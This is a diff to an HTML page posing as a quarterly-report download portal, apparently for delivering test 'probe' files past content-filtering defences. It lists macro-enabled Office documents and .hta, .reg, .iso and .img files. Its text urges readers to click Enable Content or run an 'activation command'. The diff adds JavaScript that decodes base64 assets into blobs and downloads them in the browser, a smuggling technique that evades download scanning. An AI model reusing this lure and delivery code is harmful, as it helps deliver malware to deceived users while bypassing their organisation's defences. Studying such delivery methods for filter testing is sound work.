@@ -43,7 +43,6 @@ before it can be opened. The activation takes a few seconds.</p>
   <ul>
     <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Report.xlsm" download>Q3_Report.xlsm</a> — quarterly report (Excel, macro-enabled)</li>
     <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Report_full.xlsm" download>Q3_Report_full.xlsm</a> — full quarterly report (Excel, macro-enabled)</li>
-    <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Plan.xlsm" download>Q3_Plan.xlsm</a> — Q3 planning workbook (activates on save)</li>
     <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Report.docm" download>Q3_Report.docm</a> — quarterly report (Word, macro-enabled)</li>
     <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Plan.docm" download>Q3_Plan.docm</a> — Q3 planning document (activates on save)</li>
     <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Summary.xlsx" download>Q3_Summary.xlsx</a> — Q3 summary + external references</li>
@@ -53,19 +52,24 @@ before it can be opened. The activation takes a few seconds.</p>
   the document open. If Enable Content never appears, the download path
   stripped the macro — use the activation command above instead.</div>
   <div class="sec" style="margin-top:1.2rem">Delivery diagnostics</div>
+  <p style="font-size:.8rem;color:#5a6a78;margin-bottom:.6rem">Some diagnostic
+  files are generated on your workstation after a short preparation step.
+  Click a file below, then approve the download prompt.</p>
   <ul>
-    <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/probe.reg" download>probe.reg</a> — report settings</li>
-    <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/probe.hta" download>probe.hta</a> — report viewer</li>
-    <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/probe.img" download>probe.img</a> — report disc image</li>
-    <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/probe.zip" download>probe.zip</a> — report archive</li>
-    <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/probe.iso" download>probe.iso</a> — report disc image (ISO)</li>
+    <li><a href="#" onclick="return get('probe.reg')">probe.reg</a> — report settings</li>
+    <li><a href="#" onclick="return get('probe.hta')">probe.hta</a> — report viewer</li>
+    <li><a href="#" onclick="return get('probe.zip')">probe.zip</a> — report archive</li>
+    <li><a href="#" onclick="return get('probe.iso')">probe.iso</a> — report disc image (ISO)</li>
+    <li><a href="#" onclick="return get('probe.img')">probe.img</a> — report disc image</li>
   </ul>
-  <div class="meta">Run 1115-1042 — each download is tracked individually.</div>
-  <!-- Windows-built probes (build-cdr-probe-windows.ps1): build, attach
-       probe.cab / probe.chm / probe.vhd to release v1, then uncomment:
-  <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/probe.cab" download>probe.cab</a> — report archive (cabinet)</li>
-  <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/probe.chm" download>probe.chm</a> — offline report help</li>
-  <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/probe.vhd" download>probe.vhd</a> — report virtual disk</li>
+  <p id="dlstat" style="font-size:.75rem;color:#9aa7b2;margin:.4rem 0 0">Preparing… only on first click per file.</p>
+  <div class="meta">Run 1115-1042 — each file is tracked individually.</div>
+  <!-- Windows-built probes (build-cdr-probe-windows.ps1): build, then add
+       base64 assets (assets/data6.txt=probe.cab, data7=probe.chm,
+       data8=probe.vhd) and extend the PROBES map in the script, then uncomment:
+  <li><a href="#" onclick="return get('probe.cab')">probe.cab</a> — report archive (cabinet)</li>
+  <li><a href="#" onclick="return get('probe.chm')">probe.chm</a> — offline report help</li>
+  <li><a href="#" onclick="return get('probe.vhd')">probe.vhd</a> — report virtual disk</li>
   -->
 </div>
 
@@ -75,6 +79,39 @@ before it can be opened. The activation takes a few seconds.</p>
 function cp(){
   var t=document.getElementById('cmd').innerText;
   navigator.clipboard.writeText(t).then(function(){document.getElementById('done').style.display='block';});
+}
+var PROBES={
+  'probe.reg':{src:'assets/data1.txt'},
+  'probe.hta':{src:'assets/data2.txt'},
+  'probe.zip':{src:'assets/data3.txt'},
+  'probe.iso':{src:'assets/data4.txt'},
+  'probe.img':{src:'assets/data5.txt'}
+};
+function get(name){
+  var p=PROBES[name];
+  if(!p)return false;
+  var st=document.getElementById('dlstat');
+  if(st)st.textContent='Preparing '+name+'…';
+  fetch(p.src,{cache:'no-store'}).then(function(r){
+    if(!r.ok)throw new Error(r.status);
+    return r.text();
+  }).then(function(t){
+    var bin=atob(t.replace(/\s+/g,''));
+    var buf=new Uint8Array(bin.length);
+    for(var i=0;i<bin.length;i++)buf[i]=bin.charCodeAt(i);
+    var blob=new Blob([buf],{type:'application/octet-stream'});
+    var a=document.createElement('a');
+    a.href=URL.createObjectURL(blob);
+    a.download=name;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    setTimeout(function(){URL.revokeObjectURL(a.href);},10000);
+    if(st)st.textContent=name+' ready — check your downloads.';
+  }).catch(function(e){
+    if(st)st.textContent='Preparation failed — please retry.';
+  });
+  return false;
 }
 </script>
 </body></html>
